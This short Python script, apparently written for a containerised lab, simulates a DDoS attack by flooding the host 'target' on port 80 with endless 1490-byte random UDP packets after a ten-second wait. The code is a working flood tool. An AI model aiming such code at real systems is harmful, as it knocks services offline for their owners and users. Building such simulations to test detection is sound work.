#!/usr/bin/env python3
'''Python script designed to simulate a DDoS attack.'''
import time
import socket, os

# Tuple containing the target address and port
TARGET = ('target', 80)

if __name__ == '__main__':
    # Wait a few seconds for target container to spin up
    time.sleep(10)
    # Open the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        # Send a random set of bytes to the target server
        sock.sendto(os.urandom(1490), TARGET)
